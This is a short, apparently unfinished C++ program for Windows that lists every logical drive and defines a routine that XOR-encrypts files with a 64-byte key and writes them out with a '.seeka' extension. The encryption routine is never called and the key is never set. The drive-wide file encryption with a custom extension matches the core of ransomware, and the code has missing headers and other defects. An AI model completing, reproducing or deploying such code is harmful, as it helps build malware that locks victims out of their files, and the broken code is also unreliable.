#include<iostream>
#include<Windows.h>
#include<vector>
#include<string>
using namespace std;
namespace fs = std::filesystem;
char key[65];

vector<string>getDrives()
{
vector<string>Drives;
char* lDrives =new char[MAX_PATH]();
if(GetLogicalDriveStringsA(MAX_PATH, lDrives))
{
    for(int i=0;i < 100;i+=4)
    {
        if (lDrives[i] != (char)0)
        {Drives.push_back(string{lDrives[i],lDrives[i+1],lDrives[i+2]});}
    }
}
delete[] lDrives;
return Drives;
}
void xor_encrypt(string path)
{
ifstream input{path,ios::binary};
ofstream output{path +".seeka", ios::binary};

char buffer[64];
while(!input.eof()){
    input.read(buffer, 64);
    for(size_t i =0; i <64; i++){
        buffer[i] ^= key[i];
    }
    output.write(buffer, input.gcount());
}
input.close();
}
int main()
{
vector<string> lecteurs = getDrives();
for (auto lec : lecteurs)
{
    cout << lec << endl;
}
}